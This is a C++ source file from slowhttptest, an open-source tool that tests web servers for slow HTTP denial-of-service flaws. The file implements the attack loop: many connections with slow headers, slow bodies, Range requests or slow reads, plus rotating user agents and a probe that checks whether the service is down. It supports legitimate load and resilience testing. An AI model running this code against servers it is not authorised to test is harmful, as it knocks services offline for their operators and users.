/*****************************************************************************
*  Copyright 2011 Sergey Shekyan
*
*  Licensed under the Apache License, Version 2.0 (the "License");
*  you may not use this file except in compliance with the License.
*  You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
* *****************************************************************************/

/*****
 * Author: Sergey Shekyan shekyan@gmail.com
 *
 * Slow HTTP attack vulnerability test tool
 *  http://code.google.com/p/slowhttptest/
 *****/
#include "config.h"
#include "slowhttptest.h"

#include <errno.h>
#include <math.h>
#include <stdio.h>
#include <unistd.h>

#include <numeric>
#include <sstream>
#include <string>
#include <vector>

#include <netdb.h>
#include <netinet/in.h>
#ifdef HAVE_POLL
#include <sys/poll.h>
#endif
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/socket.h>

#include "range-generator.h"
#include "slowlog.h"
#include "slowsocket.h"
#include "slowhttptest.h"
#include "slowstats.h"
#include "text-generator.h"

// Global flag to indicate if we need to run.
extern int g_running;

namespace {
static const int kBufSize = 65537;
// update ExitStatusType too
static const char* exit_status_msg[] = {
    "Hit test time limit",
    "No open connections left",
    "Cannot establish connection",
    "Connection refused",
    "Cancelled by user",
    "Unexpected error"
};
// update ProxyType too 
static const char* proxy_type_name[] = {
    "HTTP proxy at ",
    "HTTP tunnel at ",
    "SOCKS 4 at ",
    "SOCKS 5 at ",
    "probe proxy at ",
    "no proxy"
};
static const char* test_type_name[] = {
    "SLOW HEADERS",
    "SLOW BODY",
    "RANGE",
    "SLOW READ"
};
static const char* user_agents[] = {
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7) "
    "AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
    "AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) "
    "Gecko/20100101 Firefox/5.0.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) "
    "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) "
    "Presto/2.9.168 Version/11.50",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)"
};
static const char referer[] = 
    "Referer: http://code.google.com/p/slowhttptest/\r\n";
static const char post_request[] = "Connection: close\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Accept: text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n\r\n"
    "foo=bar";
// per RFC 2616 section 4.2, header can be any US_ASCII character (0-127),
// but we'll start with X-
static const char header_prefix[] = "X-";
static const char header_separator[] = ": ";

static const char body_prefix[] = "&";
static const char body_separator[] = "=";

static const char crlf[] = "\r\n";
static const char peer_closed[] = "Peer closed connection";
static const char symbols[] =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

}  // namespace

namespace slowhttptest {
SlowHTTPTest::SlowHTTPTest(int delay, int duration, 
                           int interval, int con_cnt,
                           int max_random_data_len,
                           int content_length, SlowTestType type,
                           bool need_stats, int pipeline_factor, 
                           int probe_interval,
                           int range_start, int range_limit,
                           int read_interval, int read_len,
                           int window_lower_limit,
                           int window_upper_limit,
                           ProxyType proxy_type,
                           int debug_level)
    : probe_socket_(0),
      delay_(delay),
      duration_(duration),
      followup_timing_(interval),
      followup_cnt_(duration_ / followup_timing_),
      num_connections_(con_cnt),
      pipeline_factor_(pipeline_factor),
      probe_timeout_(probe_interval),
      extra_data_max_len_(max_random_data_len),
      seconds_passed_(0),
      content_length_(content_length),
      test_type_(type),
      need_stats_(need_stats),
      range_start_(range_start),
      range_limit_(range_limit),
      exit_status_(eCancelledByUser),
      extra_data_max_len_total_(0),
      read_interval_(read_interval),
      read_len_(read_len),
      window_lower_limit_(window_lower_limit),
      window_upper_limit_(window_upper_limit),
      is_dosed_(false),
      proxy_type_(proxy_type),
      debug_level_(debug_level) {
}

SlowHTTPTest::~SlowHTTPTest() {
  freeaddrinfo(addr_);

  for(std::vector<StatsDumper*>::iterator i = dumpers_.begin();
       i != dumpers_.end(); ++i) {
    delete *i;
  }
  if(probe_socket_) {
    delete probe_socket_;
  }

  dumpers_.clear();
  if(sock_.size() > 0) {
    for(int i = 0; i < num_connections_; ++i) {
      delete sock_[i];
    }
  }
  sock_.clear();
}

bool SlowHTTPTest::change_fd_limits() {
  rlimit fd_limit = {0, 0};
  if(getrlimit(RLIMIT_NOFILE, &fd_limit)) {
    slowlog(LOG_ERROR, " error getting limits for open files: %s\n", strerror(errno));
    return false;
  }
  // +3 is stdin, stdout, stderr + 2 for stat fds + 4 spare
  if(fd_limit.rlim_cur != RLIM_INFINITY && fd_limit.rlim_cur < (unsigned)(num_connections_ + 10)) { //extend limits
    if(fd_limit.rlim_max == RLIM_INFINITY || fd_limit.rlim_max > (unsigned)(num_connections_ + 10)) {
      fd_limit.rlim_cur = num_connections_ + 10;
    } else { // max limit is lower than requested
      fd_limit.rlim_cur = fd_limit.rlim_max;
      num_connections_ = fd_limit.rlim_max - 6;
      slowlog(LOG_INFO, " hit system limit for open fds: %d. \n"
	"Decreasing target connection number to %d\n",
	fd_limit.rlim_max,
        num_connections_);
    }
    if(setrlimit(RLIMIT_NOFILE, &fd_limit)) {
      slowlog(LOG_ERROR, " error setting limits for open files: %s\n", strerror(errno));
      return false;
    } else {
      slowlog(LOG_INFO, " set open files limit to %d\n", fd_limit.rlim_cur);
    }
  }
  return true;
}

const char* SlowHTTPTest::get_random_extra() {
  random_extra_.clear();
  random_extra_.append(prefix_);
  random_extra_.append(textgen_.get_text(extra_data_max_len_));
  random_extra_.append(separator_);
  random_extra_.append(textgen_.get_text(extra_data_max_len_));
  if(postfix_) {
    random_extra_.append(postfix_);
  }
  return random_extra_.c_str();
}

bool SlowHTTPTest::init(const char* url, const char* verb,
    const char* path, const char* proxy) {
  if(!change_fd_limits()) {
    slowlog(LOG_INFO, "error setting open file limits\n");
    
  }
  if(!base_uri_.prepare(url)) {
    slowlog(LOG_FATAL, "Error parsing URL\n");
    return false;
  }
  if(eNoProxy == proxy_type_) {
    if(!resolve_addr(base_uri_.getHost().c_str(), base_uri_.getPortStr(), &addr_)) {
      return false;
    } 
  } else {
    if(base_uri_.isSSL()) {
      slowlog(LOG_FATAL, "TLS/SSL connections through proxy are not supported yet.\n");
      return false;
    }
    if(proxy != 0 && strlen(proxy)) {
      if(!proxy_.prepare(proxy)) {
        slowlog(LOG_FATAL, "Error parsing proxy information\n");
        return false;
      } else {
        if(eHTTPProxy == proxy_type_) {
          if(!resolve_addr(proxy_.getHost().c_str(), proxy_.getPortStr(), &addr_)) {
            return false;
          }
        }
        if(eProbeProxy == proxy_type_) {
          if(!resolve_addr(base_uri_.getHost().c_str(), base_uri_.getPortStr(), &addr_)) {
            return false;
          }
          if(!resolve_addr(base_uri_.getHost().c_str(), proxy_.getPortStr(), &probe_proxy_addr_)) {
            return false;
          } 
        }
      }
    } else {
      slowlog(LOG_FATAL, "No proxy specified\n");
      return false;
    }
  }

  extra_data_max_len_total_ = extra_data_max_len_ * 2 + (eHeader == test_type_ ? 4 : 2);
  random_extra_.resize(extra_data_max_len_total_); // including separators
  user_agent_.append(user_agents[rand() % sizeof(user_agents)/sizeof(*user_agents)]);
  // promise to rewrite this mess in next release
  if(eHeader == test_type_) {
    // setup follow up data pattern
    separator_ = header_separator;
    prefix_ = header_prefix;
    postfix_ = crlf;
    // setup verb
    if(verb != 0 && strlen(verb)) {
      verb_.append(verb);
    } else {
      verb_.append("GET");
    }
  } else if(ePost == test_type_) {
    // setup follow up data pattern
    separator_ = body_separator;
    prefix_ = body_prefix;
    postfix_ = 0;
    if(strlen(verb)) {
      verb_.append(verb);
    } else {
      verb_.append("POST");
    }
  } else if(eRange == test_type_) {
    if(strlen(verb)) {
      verb_.append(verb);
    } else {
      verb_.append("HEAD");
    }
  } else if(eSlowRead == test_type_) {
    verb_.append("GET");
  }
  // start building request
  request_.clear();
  request_.append(verb_);
  request_.append(" ");
  if(eHTTPProxy == proxy_type_)
    request_.append(base_uri_.getData());
  else
    request_.append(base_uri_.getPath());
  request_.append(" HTTP/1.1\r\n");
  request_.append("Host: ");
  request_.append(base_uri_.getHost());

  if(base_uri_.getPort() != 80 && base_uri_.getPort() != 443) {
    request_.append(":");
    std::stringstream ss;
    ss << base_uri_.getPort();
    request_.append(ss.str());
  }

  request_.append("\r\n");
  request_.append("User-Agent: ");
  request_.append(user_agent_);
  request_.append("\r\n");
  request_.append(referer);
  // method for probe is always GET
  probe_request_.append("GET");
  if(eProbeProxy == proxy_type_) {
    probe_request_.append(" ");
    probe_request_.append(base_uri_.getData());
    probe_request_.append(request_.begin() + verb_.size() + 1 + base_uri_.getPathLen(), request_.end());
  } else {
    probe_request_.append(request_.begin() + verb_.size(), request_.end());
  }
  probe_request_.append("\r\n");
  if(ePost == test_type_) {
    request_.append("Content-Length: ");
    std::stringstream ss;
    ss << content_length_;
    request_.append(ss.str());
    request_.append("\r\n");
    request_.append(post_request);
  } else if(eRange == test_type_) {
    GenerateRangeHeader(range_start_, 1, range_limit_, &request_);
  }

  if(eSlowRead == test_type_) {
    if(pipeline_factor_ > 1) {
      request_.append("Connection: Keep-Alive\r\n");
      request_.reserve(request_.length() * pipeline_factor_);
    }
    request_.append("\r\n");
    size_t len = request_.length();
    for(int i = 1; i < pipeline_factor_; ++i){
      request_.append(request_.c_str(), len);
    }
  }
  // init statistics
  if(need_stats_) {
    char csv_file_name[1024] = {0};
    char html_file_name[1024] = {0};
    if(path && strlen(path)) {
      sprintf(csv_file_name, "%s.csv", path);  
      sprintf(html_file_name, "%s.html", path);  
    } else {
      time_t rawtime;
      struct tm * timeinfo;
      time(&rawtime);
      timeinfo = localtime(&rawtime);
      strftime(csv_file_name, 22, "slow_%H%M%Y%m%d.csv", timeinfo);
      strftime(html_file_name, 23, "slow_%H%M%Y%m%d.html", timeinfo);
    }
    csv_report_.append(csv_file_name);
    html_report_.append(html_file_name);
    char test_info[1024];
    if(eSlowRead != test_type_) { 
      sprintf(test_info,"<table class='slow_results' border='0'>"
          "<tr><th>Test parameters</th></tr>"
          "<tr><td><b>Test type</b></td><td>%s</td></tr>"
          "<tr><td><b>Number of connections</b></td><td>%d</td></tr>"
          "<tr><td><b>Verb</b></td><td>%s</td></tr>"
          "<tr><td><b>Content-Length header value</b></td><td>%d</td></tr>"
          "<tr><td><b>Extra data max length</b></td><td>%d</td></tr>"
          "<tr><td><b>Interval between follow up data</b></td><td>%d seconds</td></tr>"
          "<tr><td><b>Connections per seconds</b></td><td>%d</td></tr>"
          "<tr><td><b>Timeout for probe connection</b></td><td>%d</td></tr>"
          "<tr><td><b>Target test duration</b></td><td>%d seconds</td></tr>"
          "<tr><td><b>Using proxy</b></td><td>%s %s</td></tr>"
          "</table>",
          test_type_name[test_type_],
          num_connections_,
          verb_.c_str(),
          content_length_,
          extra_data_max_len_total_,
          followup_timing_,
          delay_,
          probe_timeout_,
          duration_,
          proxy_type_name[proxy_type_],
          proxy_type_ == eNoProxy ? " " : proxy_.getData()
          );
    } else {
      sprintf(test_info,"<table class='slow_results' border='0'>"
          "<tr><th>Test parameters</th></tr>"
          "<tr><td><b>Test type</b></td><td>%s</td></tr>"
          "<tr><td><b>Number of connections</b></td><td>%d</td></tr>"
          "<tr><td><b>Receive window range</b></td><td>%d - %d</td></tr>"
          "<tr><td><b>Pipeline factor</b></td><td>%d</td></tr>"
          "<tr><td><b>Read rate from receive buffer</b></td><td>%d bytes / %d sec</td></tr>"
          "<tr><td><b>Connections per seconds</b></td><td>%d</td></tr>"
          "<tr><td><b>Timeout for probe connection</b></td><td>%d</td></tr>"
          "<tr><td><b>Target test duration</b></td><td>%d seconds</td></tr>"
          "<tr><td><b>Using proxy</b></td><td>%s %s</td></tr>"
          "</table>",
          test_type_name[test_type_],
          num_connections_,
          window_lower_limit_,
          window_upper_limit_,
          pipeline_factor_,
          read_len_,
          read_interval_,
          delay_,
          probe_timeout_,
          duration_,
          proxy_type_name[proxy_type_],
          proxy_type_ == eNoProxy ? " " : proxy_.getData()
          );
    }

    dumpers_.push_back(new HTMLDumper(html_file_name, base_uri_.getData(), 
        test_info));
    dumpers_.push_back(new CSVDumper(csv_file_name,
        "Seconds,Closed,Pending,Connected,Service Available\n"));
    for (int i = 0; i < dumpers_.size(); ++i) {
      if (!dumpers_[i]->Initialize()) {
        slowlog(LOG_FATAL, "Stat files cannot be opened for writing:\
            \n\t%s\n",
            strerror(errno));
        return false;
      }
    }
  }
  //report_parameters();
  return true;
}

void SlowHTTPTest::close_sock(int id) {
  sock_[id]->close();
}

void SlowHTTPTest::report_final() {
  slowlog(LOG_INFO, cCYA"\nTest ended on %dth second\n"
      "Exit status:" cLCY" %s\n" cRST,
      seconds_passed_,
      exit_status_msg[exit_status_]
      );
  if(need_stats_) {
    printf(cCYA"CSV report saved to " cLCY "%s\n" cRST,
    csv_report_.c_str());
    printf(cCYA"HTML report saved to " cLCY "%s\n" cRST,
    html_report_.c_str());
  }
}

void SlowHTTPTest::report_parameters() {
  if(LOG_INFO == debug_level_) {
      slowlog(LOG_INFO, "\x1b[H\x1b[2J");
  }
  if(eSlowRead != test_type_) {
      slowlog(LOG_INFO, "\n\t" cLCY PACKAGE " version " VERSION 
      "\n - https://code.google.com/p/slowhttptest/ -\n"
      cBLU "test type:" cLBL "                        %s\n"
      cBLU "number of connections:" cLBL "            %d\n"
      cBLU "URL:" cLBL "                              %s\n"
      cBLU "verb:" cLBL "                             %s\n"
      cBLU "Content-Length header value:" cLBL "      %d\n"
      cBLU "follow up data max size:" cLBL "          %d\n"
      cBLU "interval between follow up data:" cLBL "  %d seconds\n"
      cBLU "connections per seconds:" cLBL "          %d\n"
      cBLU "probe connection timeout:" cLBL "         %d seconds\n"
      cBLU "test duration:" cLBL "                    %d seconds\n"
      cBLU "using proxy:" cLBL "                      %s%s\n\n" cRST,
        test_type_name[test_type_],
        num_connections_,
        base_uri_.getData(),
        verb_.c_str(),
        content_length_,
        extra_data_max_len_total_,
        followup_timing_,
        delay_,
        probe_timeout_,
        duration_,
        proxy_type_name[proxy_type_],
        proxy_type_ == eNoProxy ? " " : proxy_.getData()
      );
  } else { // slow read
    slowlog(LOG_INFO, "\n\t" cLCY PACKAGE " version " VERSION 
      "\n - https://code.google.com/p/slowhttptest/ -\n"
      cBLU "test type:" cLBL "                       %s\n"
      cBLU "number of connections:" cLBL "           %d\n"
      cBLU "URL:" cLBL "                             %s\n"
      cBLU "verb:" cLBL "                            %s\n"
      cBLU "receive window range:" cLBL "            %d - %d\n"
      cBLU "pipeline factor:" cLBL "                 %d\n"
      cBLU "read rate from receive buffer:" cLBL "   %d bytes / %d sec\n"
      cBLU "connections per seconds:" cLBL "         %d\n"
      cBLU "probe connection timeout:" cLBL "        %d seconds\n"
      cBLU "test duration:" cLBL "                   %d seconds\n"
      cBLU "using proxy:" cLBL "                     %s%s\n\n" cRST,
        test_type_name[test_type_],
        num_connections_,
        base_uri_.getData(),
        verb_.c_str(),
        window_lower_limit_,
        window_upper_limit_,
        pipeline_factor_,
        read_len_,
        read_interval_,
        delay_,
        probe_timeout_,
        duration_,
        proxy_type_name[proxy_type_],
        proxy_type_ == eNoProxy ? " " : proxy_.getData()
      );
  }
}

void SlowHTTPTest::report_status(bool to_stats) {
  initializing_ = 0;
  connecting_ = 0; 
  connected_ = 0; 
  errored_ = 0; 
  closed_ = 0;

  std::vector<SlowSocket*>::iterator it;
  SocketState state;
  for(it = sock_.begin(); it < sock_.end(); ++it) {
    if((*it)) {
      state = (*it)->get_state();
      switch(state) {
        case eInit:
          ++initializing_;
          break;
        case eConnecting:
          ++connecting_;
          break;
        case eConnected:
          ++connected_;
          break;
        case eError:
          ++errored_;
          break;
        case eClosed:
          ++closed_;
          break;
        default:
          slowlog(LOG_ERROR, "Unknown socket state: %d", state);
          break;
       }
    }
  }

  if(to_stats) {
    for (int i = 0; i < dumpers_.size(); ++i) {
      dumpers_[i]->WriteStats("%d,%d,%d,%d,%d",
          seconds_passed_, 
          closed_,
          connecting_,
          connected_,
          !is_dosed_ * num_connections_);
    }
  } else {
    slowlog(LOG_INFO, cLGN"\nslow HTTP test status on "cGRN"%d"cLGN"th second:\n\n"
      cLGN"initializing:" cLGN"        %d\n"
      cLGN"pending:     " cLGN"        %d\n"
      cLGN"connected:   " cLGN"        %d\n"
      cLGN"error:       " cLGN"        %d\n"
      cLGN"closed:      " cLGN"        %d\n"
      cLGN"service available:"cLGN"   %s\n"cRST,
        seconds_passed_,
        initializing_,
        connecting_,
        connected_,
        errored_,
        closed_,
        is_dosed_ ? cLRD"NO"cRST: cLGN"YES"cRST);
  }
}

bool SlowHTTPTest::resolve_addr(const char* host, const char* port, addrinfo  **addr) {
  int error;
  addrinfo hints;
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = PF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  // resolve the domain name into a list of addresses
  error = getaddrinfo(host, port, &hints, addr);
  if(error != 0) {
    slowlog(LOG_FATAL, "Error in getaddrinfo: %s\n", gai_strerror(error));
    return false;
  }
  return true;
}

bool SlowHTTPTest::run_test() {
  int num_connected = 0;
#ifdef HAVE_POLL  
  pollfd *fds = new pollfd[num_connections_ + 1]; // +1 for probe socket 
  memset(fds, 0, sizeof(pollfd) * (num_connections_ + 1));
  const int timeout = 1000; // constant 1 second timeout for poll 
#else
  fd_set readfds, writefds;
  timeval timeout;
  timerclear(&timeout);
#endif
  int maxfd = 0;
  int result = 0;
  int ret = 0;
  timeval now, start, progress_timer, 
          tv_delay;

  // connection rate per second
  tv_delay.tv_sec = 0;
  tv_delay.tv_usec = 1000000 / delay_; 
  int active_sock_num;
  bool is_any_ever_connected = false;
  char buf[kBufSize];
  const char* extra_data;
  int heartbeat_reported = 1; //trick to print 0 sec hb
  int stats_reported = 1; //trick to print 0 sec hb
  int probe_taken = -1; // connect probe every second 
  int connection_timeout = followup_timing_;
  timerclear(&now);
  timerclear(&progress_timer);
  gettimeofday(&start, 0);
  sock_.resize(num_connections_);

  // select/poll loop
  while(true) {
    int wr = 0;
    seconds_passed_ = progress_timer.tv_sec;
#ifndef HAVE_POLL  
    FD_ZERO(&readfds);
    FD_ZERO(&writefds);
#endif
    // init and connect probe socket
    if(!probe_socket_ && probe_taken != seconds_passed_ && seconds_passed_ % probe_timeout_ == 0) {
      probe_socket_ = new SlowSocket();
      if(probe_socket_->init(addr_, proxy_type_ == eNoProxy ? base_uri_.isSSL() : false, maxfd, 0)) {
        probe_socket_->set_state(eConnecting);
        probe_taken = seconds_passed_;
      slowlog(LOG_DEBUG, "%s: created probe socket %d\n",
          __FUNCTION__, probe_socket_->get_sockfd());
      } else {
        slowlog(LOG_ERROR, "%s: Unable to initialize probe socket.\n", __FUNCTION__);
      }
    } else {
      if(probe_socket_ && probe_socket_->get_sockfd() > 0 &&
          (seconds_passed_ - probe_taken >= probe_timeout_)) {
        delete probe_socket_;
        probe_socket_ = NULL;
        fds[0].fd = -1;
        fds[0].events = 0;
        fds[0].revents = 0;
        is_dosed_ = true;
      }
    }
    if(probe_socket_ && probe_socket_->get_sockfd() > 0) {
#ifdef HAVE_POLL
      fds[0].fd = probe_socket_->get_sockfd();
      fds[0].events = 0;
#endif
      if(probe_socket_->get_requests_to_send()) {
#ifdef HAVE_POLL
        fds[0].events |= POLLOUT;
#else
        FD_SET(probe_socket_->get_sockfd(), &writefds);
#endif
        ++wr;
      }
#ifdef HAVE_POLL
      fds[0].events |= POLLIN;
#else
      FD_SET(probe_socket_->get_sockfd(), &readfds);
#endif
    }

    active_sock_num = 0;
    if(num_connected < num_connections_) {
      sock_[num_connected] = new SlowSocket();
      sock_[num_connected]->set_state(eInit);
      if(!sock_[num_connected]->init(addr_, proxy_type_ == eNoProxy ? base_uri_.isSSL() : false, maxfd,
          (eRange == test_type_ || eSlowRead == test_type_) ? 0 : followup_cnt_,
          eSlowRead == test_type_ ? read_interval_ : 0,
          window_lower_limit_, window_upper_limit_)) {
        sock_[num_connected]->set_state(eError);
        slowlog(LOG_ERROR, "%s: Unable to initialize %dth slow  socket.\n", __FUNCTION__,
            (int) num_connected);
        num_connections_ = num_connected;
      } else {
        sock_[num_connected]->set_state(eConnecting);
        ++num_connected;
      }
    }
    for(int i = 0; i < num_connected; ++i) {
      if(sock_[i] && sock_[i]->get_sockfd() > 0) {
#ifdef HAVE_POLL
        fds[i+1].fd = sock_[i]->get_sockfd();
        fds[i+1].events = 0;
#endif
        if(sock_[i]->is_ready_read(&progress_timer)) {
#ifdef HAVE_POLL
          fds[i+1].events |= POLLIN;
#else
          FD_SET(sock_[i]->get_sockfd(), &readfds);
#endif
        }
        ++active_sock_num;
        if(sock_[i]->get_requests_to_send() > 0) {
          ++wr;
#ifdef HAVE_POLL
          fds[i+1].events |= POLLOUT;
#else
          FD_SET(sock_[i]->get_sockfd(), &writefds);
#endif
        } else if(sock_[i]->get_followups_to_send() > 0
            && (seconds_passed_ > 0 && seconds_passed_ % followup_timing_ == 0)) {
          if(sock_[i]->get_last_followup_timing() != seconds_passed_) {
            sock_[i]->set_last_followup_timing(seconds_passed_);
            ++wr;
#ifdef HAVE_POLL
            fds[i+1].events |= POLLOUT;
#else
            FD_SET(sock_[i]->get_sockfd(), &writefds);
#endif
          }
        }
      }
    }
    // Print every second.
    if(need_stats_ && stats_reported != seconds_passed_) {
      report_status(true /*print_stats*/);
      stats_reported = seconds_passed_;
    }
    // Print every 5 seconds.
    if(seconds_passed_ % 5 == 0 && heartbeat_reported != seconds_passed_) {
      if(LOG_INFO == debug_level_)
      report_parameters();
      report_status(false /*print_stats*/);
      heartbeat_reported = seconds_passed_;
    }
    if(!g_running) {
      exit_status_ = eCancelledByUser;
      break;
    }
    // rude way to detect if something is wrong after connection_timeout
    if(seconds_passed_ > connection_timeout && !is_any_ever_connected) {
      if(connected_ == 0 && connecting_ > 0 && closed_ == 0) {
        exit_status_ = eHostNotAlive;
      } else if (closed_ >= 0 && connecting_ >= 0) {
        exit_status_ = eConnectionRefused;
      }
      break;
    }
    if(seconds_passed_ > duration_) { // hit time limit
      exit_status_ = eTimeLimit;
      break;
    } 
    if(active_sock_num == 0) { //no open connections left
      if(!is_any_ever_connected) {
        exit_status_ = eConnectionRefused;
      }
      else {
        exit_status_ = eAllClosed;
      }
      break;
    }

#ifdef HAVE_POLL
    // do not block if have new connections to establish
    result = poll(fds, (nfds_t)num_connections_ + 1,
     (num_connected < num_connections_)? 0 : timeout);
#else
    // do not block if have new connections to establish
    timeout.tv_sec = (num_connected < num_connections_)? 0 : 1;
    timeout.tv_usec = 0; //microseconds
    result = ::select(maxfd + 1, &readfds, wr ? &writefds : NULL, NULL,
     &timeout);
#endif
    ::gettimeofday(&now, 0);
    timersub(&now, &start, &progress_timer);
    if(result < 0) {
     // slowlog(LOG_FATAL, "%s: select < num_connections_error: %s\n", __FUNCTION__, strerror(errno));
      break;
    } else if(result == 0) {
      // nothing to monitor
      //continue;
    } else {
      if(probe_socket_ && probe_socket_->get_sockfd() > 0) {
#ifdef HAVE_POLL
        if(fds[0].revents & POLLIN) {
#else
        if(FD_ISSET(probe_socket_->get_sockfd(), &readfds)) {
#endif
          ret = probe_socket_->recv_slow(buf, kBufSize);
          buf[ret] = '\0';
          if(ret < 0 && errno != EAGAIN) {
            is_dosed_ = true;
            slowlog(LOG_DEBUG, "%s: probe socket %d closed: %s\n", __FUNCTION__,
                probe_socket_->get_sockfd(),
                strerror(errno));
            delete probe_socket_;
            probe_socket_ = NULL;
#ifdef HAVE_POLL
            fds[0].events = 0;
#endif
          } else {
            if(ret > 0) {
              slowlog(LOG_DEBUG, "%s:probe socket %d replied %d bytes:\n %s\n", __FUNCTION__,
                  probe_socket_->get_sockfd(), ret, buf);
                  is_dosed_ = false;
                  delete probe_socket_;
                  probe_socket_ = NULL;
#ifdef HAVE_POLL
                  fds[0].events = 0;
#endif
            } else {
              slowlog(LOG_DEBUG, "%s: pending probe socket %d\n", __FUNCTION__,
                   probe_socket_->get_sockfd());
            }

          }
        }
      }
      if(probe_socket_ && probe_socket_->get_sockfd() > 0) {
#ifdef HAVE_POLL
        if(fds[0].revents & POLLOUT) {
#else
        if(FD_ISSET(probe_socket_->get_sockfd(), &writefds)) {
#endif
          ret = probe_socket_->send_slow(probe_request_.c_str(),
           probe_request_.size());
          if(ret <= 0 && errno != EAGAIN) {
            is_dosed_ = true;
            slowlog(LOG_DEBUG,
                "%s:error sending request on probe socket %d:\n%s\n",
                __FUNCTION__, probe_socket_->get_sockfd(),
                strerror(errno));
            delete probe_socket_;
            probe_socket_ = NULL;
          } else {
            if(ret > 0) { //actual data was sent
              slowlog(LOG_DEBUG,
                  "%s:%d of %d bytes sent on probe socket %d:\n%s\n",
                  __FUNCTION__, ret,
                  (int) probe_request_.size(),
                  (int) probe_socket_->get_sockfd(),
                  probe_request_.c_str());
            } else {
              slowlog(LOG_DEBUG, "%s: pending probe socket %d\n", __FUNCTION__,
                   probe_socket_->get_sockfd());
            }
          }
        }
      }

      for(int i = 0; i < num_connected; i++) {
        if(sock_[i] && sock_[i]->get_sockfd() > 0) {
#ifdef HAVE_POLL
          if(fds[i+1].revents & POLLIN) {
#else
          if(FD_ISSET(sock_[i]->get_sockfd(), &readfds)) { // read
#endif
            ret = sock_[i]->recv_slow(buf, (eSlowRead == test_type_ ? read_len_ : kBufSize));
            if(ret <= 0 && errno != EAGAIN) {
              sock_[i]->set_state(eClosed);
              slowlog(LOG_DEBUG, "%s: socket %d closed: %s\n", __FUNCTION__,
                  sock_[i]->get_sockfd(),
                  ret?strerror(errno):peer_closed);
              close_sock(i);
#ifdef HAVE_POLL
              fds[i+1].events = 0;
#endif
              continue;
            } else {
              if(ret > 0) {// actual data recieved
                buf[ret] = '\0';
                slowlog(LOG_DEBUG, "%s: socket %d replied %d bytes:\n%s\n", __FUNCTION__,
                    sock_[i]->get_sockfd(),ret, buf);
                sock_[i]->set_last_read(&progress_timer);
              } else {
                // still in connect phase
                //slowlog(LOG_DEBUG, "socket %d rd status:%s\n",
                //    (int)sock_[i]->get_sockfd(),
                //    strerror(errno));
              }
            }
          }
#ifdef HAVE_POLL
          if(fds[i+1].revents & POLLOUT) {
#else
          if(FD_ISSET(sock_[i]->get_sockfd(), &writefds)) { // write
#endif
            if(sock_[i]->get_requests_to_send() > 0) {
              ret = sock_[i]->send_slow(request_.c_str(),
                  request_.size());
              if(ret <= 0 && errno != EAGAIN) {
                sock_[i]->set_state(eClosed);
                slowlog(LOG_DEBUG,
                    "%s:error sending initial slow request on socket %d:\n%s\n",
                    __FUNCTION__, sock_[i]->get_sockfd(),
                    strerror(errno));
                close_sock(i);
#ifdef HAVE_POLL
                fds[i+1].events = 0;
#endif
                continue;
              } else {
                if(ret > 0) { //actual data was sent
                  sock_[i]->set_state(eConnected);
                  is_any_ever_connected = true;
                  slowlog(LOG_DEBUG,
                      "%s:initial %d of %d bytes sent on socket %d:\n%s",
                      __FUNCTION__, ret,
                      (int) request_.size(),
                      (int) sock_[i]->get_sockfd(),
                      request_.c_str());
                } else {
                  // still in connect phase
                  //slowlog(LOG_DEBUG, "socket %d wr status:%s\n",
                  //    (int)sock_[i]->get_sockfd(),
                  //    strerror(errno));
                }
              }
            } else if(sock_[i]->get_followups_to_send() > 0
                && (seconds_passed_ > 0
                    && seconds_passed_ % followup_timing_ == 0)) {
              extra_data = get_random_extra();
              ret = sock_[i]->send_slow(extra_data,
                  strlen(extra_data), eFollowUpSend);
              if(ret <= 0 && errno != EAGAIN) {
                sock_[i]->set_state(eClosed);
                slowlog(LOG_DEBUG,
                    "%s:error sending follow up data on socket %d:\n%s\n",
                    __FUNCTION__, sock_[i]->get_sockfd(),
                    strerror(errno));
                close_sock(i);
#ifdef HAVE_POLL
                fds[i+1].events = 0;
#endif
                continue;
              } else {
                if(ret > 0) { //actual data was sent
                  slowlog(LOG_DEBUG,
                      "%s:%d of %d bytes of follow up data sent on socket %d:\n%s\n%d follow ups left\n",
                        __FUNCTION__, ret,
                        (int) strlen(extra_data),
                        (int) sock_[i]->get_sockfd(),
                        extra_data,
                        sock_[i]->get_followups_to_send());
                } else {
                  // still in connect phase
                  // slowlog(LOG_DEBUG, "socket %d wr status:%s\n",
                  //     (int)sock_[i]->get_sockfd(),
                  //     strerror(errno));
                }
              }
            }
          } else {
            // if(sock_[i] && sock_[i]->get_requests_to_send() > 0) {
              // trying to connect, server slowing down probably
            //  slowlog(LOG_WARN, "pending connection on socket %d\n", sock_[i]->get_sockfd());
            //}
          }
        }
      }
    }
    
    if(num_connected < num_connections_) {
      // throttle down conenction rate, assume connect() returned immediately
      usleep(tv_delay.tv_usec);
    }
  }
#ifdef HAVE_POLL
  delete [] fds;
#endif
  return true;
}
}  // namespace slowhttptest
